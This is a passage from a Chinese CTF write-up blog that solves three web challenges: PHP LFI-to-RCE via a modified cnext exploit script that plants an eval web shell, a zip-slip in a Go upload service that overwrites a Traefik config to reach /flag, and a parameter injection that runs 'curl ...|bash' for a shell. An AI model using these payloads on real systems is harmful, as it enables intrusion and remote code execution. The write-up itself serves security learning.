class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">upload.php<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>首先看到一个文件上传，一个<code>file_get_contents</code>函数</p><p>文件上传那块测了很久，结果mime类型一直错，倒是<code>file_get_contents</code>可以任意文件读取</p><p>拿到了一些东西</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;users&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;3522418a-e150-41b3-9a7d-ac41d3f4576a&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$2y$10$TJqRZATYatGq16hhzgFNye.mJ83nblneeHXFFIArCsInETF1l2IXy&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是没啥用，卡了几个小时</p><p><strong>正确方法：</strong></p><p>LFI to RCE</p><p><a href="https://www.cnblogs.com/ddd-flag">具体原理参考</a></p><p><a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">脚本地址</a></p><p>把Romote类改成这样—-注意用户名和cookie替换成自己的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.url = url<br>        <span class="hljs-variable language_">self</span>.session = Session()<br>        <span class="hljs-variable language_">self</span>.session.headers = &#123;<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,<br>            <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=3b3e88b173b7a66ef0d737c1d6dd92b6&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        files = &#123;<br>        <span class="hljs-string">&quot;avatar&quot;</span>: (<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">b&quot;&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>),  <span class="hljs-comment"># 空文件</span><br>        <span class="hljs-string">&quot;url&quot;</span>: (<span class="hljs-literal">None</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>),  <span class="hljs-comment"># 普通字段</span><br>        &#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;url:  <span class="hljs-subst">&#123;self.url&#125;</span>&quot;</span>)<br>        req1=<span class="hljs-variable language_">self</span>.session.post(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, files=files)<br>        req2=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req2<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">mysend</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        req=<span class="hljs-variable language_">self</span>.session.get(<span class="hljs-variable language_">self</span>.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>)<br>        <span class="hljs-keyword">return</span> req<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        <span class="hljs-built_in">print</span>(path)<br>        response = <span class="hljs-variable language_">self</span>.send(path)<br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">return</span> base64.decode(data)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>运行poc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exp.py http://39.106.16.204:12626/ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?=@eval(\$_POST[0]);?&gt;&#x27;</span> &gt; 1.php<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>然后访问1.php POST传参</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209224407146.png" alt="image-20250209224407146"></p><h2 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h2><p>源码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;archive/zip&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;path/filepath&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br><br><span class="hljs-string">&quot;github.com/gin-gonic/gin&quot;</span><br><span class="hljs-string">&quot;github.com/google/uuid&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> uploadDir = <span class="hljs-string">&quot;./uploads&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipSimpleFile</span><span class="hljs-params">(file *zip.File, filePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>outFile, err := os.Create(filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> outFile.Close()<br><br>fileInArchive, err := file.Open()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> fileInArchive.Close()<br><br>_, err = io.Copy(outFile, fileInArchive)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">unzipFile</span><span class="hljs-params">(zipPath, destDir <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>zipReader, err := zip.OpenReader(zipPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> zipReader.Close()<br><br><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> zipReader.File &#123;<br>filePath := filepath.Join(destDir, file.Name)<br><span class="hljs-keyword">if</span> file.FileInfo().IsDir() &#123;<br><span class="hljs-keyword">if</span> err := os.MkdirAll(filePath, file.Mode()); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = unzipSimpleFile(file, filePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">randFileName</span><span class="hljs-params">()</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> uuid.New().String()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>r := gin.Default()<br>r.LoadHTMLGlob(<span class="hljs-string">&quot;templates/*&quot;</span>)<br><br>r.GET(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>xForwardedFor := c.GetHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>)<br><br><span class="hljs-keyword">if</span> !strings.Contains(xForwardedFor, <span class="hljs-string">&quot;127.0.0.1&quot;</span>) &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;only localhost can get flag&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>flag := os.Getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-string">&quot;&quot;</span> &#123;<br>flag = <span class="hljs-string">&quot;flag&#123;testflag&#125;&quot;</span><br>&#125;<br><br>c.String(http.StatusOK, flag)<br>&#125;)<br><br>r.GET(<span class="hljs-string">&quot;/public/index&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;)<br><br>r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>randomFolder := randFileName()<br>destDir := filepath.Join(uploadDir, randomFolder)<br><br><span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br><span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error unzipping file:&quot;</span>, err)<br>c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>&#125;)<br>&#125;)<br><br>r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>看源码好像还是挺简单的吧，只要<code>xff</code>访问<code>/flag</code>就行，但是看配置文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dynamic configuration</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br></code></pre></td></tr></table></figure><p>使用了反向代理只要访问<code>/public/index</code>和<code>/public/upload</code>的流量才会传给服务器这也是为什么打开容器就是404的原因</p><p>我们再来分析源码，看见只让上传压缩包，还会解压，验证方式也是使用的<code>archive/zip模块</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png" alt="image-20250209210831989"></p><p>那我们可以尝试zip解压导致<strong>任意文件覆盖</strong></p><p>我们看下他的目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/                                      <span class="hljs-comment"># 根目录</span><br>├── /traefik                           <span class="hljs-comment"># Traefik 二进制文件</span><br>├── /src                                <span class="hljs-comment"># 项目的源代码目录(删到了)</span><br>├── /app                                <span class="hljs-comment"># 应用目录，包含构建后的二进制文件和配置文件</span><br>│   ├── /main                          <span class="hljs-comment"># 生成的 Go 二进制文件</span><br>│   ├── /uploads                       <span class="hljs-comment"># 上传的文件存储目录</span><br>│   ├── /templates                     <span class="hljs-comment"># 应用模板目录</span><br>│   └── /.config                        <span class="hljs-comment"># 配置文件目录</span><br>│       ├── /dynamic.yml               <span class="hljs-comment"># 动态配置文件</span><br>│       └── /traefik.yml               <span class="hljs-comment"># Traefik 配置文件</span><br>├── /run.sh                             <span class="hljs-comment"># 启动脚本</span><br></code></pre></td></tr></table></figure><p>还发现每次访问都会加载<code>templates/index.html</code>那么我们就可以覆盖他写一个xss拿到flag对不对</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, &#123; <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &#125; &#125;)<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = data; &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>如果你也这么想，那你就错了，错在哪</p><ol><li></li></ol><blockquote><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -h /dev/null ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /app/uploads &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> ctf:ctf -R /app/.config /app/uploads </span><br></code></pre></td></tr></table></figure><p>看dockerfile可以发现我们对<code>templates</code>文件夹并没有权限，无法进行写入，（在本地测了好久都可以，但是上传平台不成功)</p></blockquote><ol start="2"><li></li></ol><blockquote><p>使用的是反向代理，xss脚本的header就无效了</p></blockquote><p>所有我们得覆盖配置文件，覆盖这个动态配置文件</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png" alt="image-20250209212939429"></p><p>首先我们准备好配置文件脚本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">forwardedHeaders:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;&#123;127.0.0.1&#125;&quot;</span><br><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br></code></pre></td></tr></table></figure><p>命名为<code>..1..1.config1dynamic.yml</code>(文件名不能有<code>/</code>暂时用<code>1</code>代替)</p><p>将他压缩，拿到notepad++（winhex也行）打开</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png" alt="image-20250209213519539"></p><p>把<code>1</code>换成<code>/</code>，有两处都要换上</p><p>上传平台，在访问&#x2F;flag就可以</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png" alt="image-20250209213900279"></p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这个题目，呜呜呜，刚进去完全不知道要干嘛，第一次看源码也没翻到最下面，浅浅的翻了一下，第二天再看的时候才再最下面找到</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>我们直接再上传<code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>成功拿到shell</p><p>查看根目录发现有flag，但是权限不够</p><p>尝试suid提权但是没有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>看一下<code>ps -ef</code>看看执行了什么</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>发先执行了<code>/start.sh</code>和<code>backup.sh</code></p><p>start没有权限看不了，那就看backup</p><figure 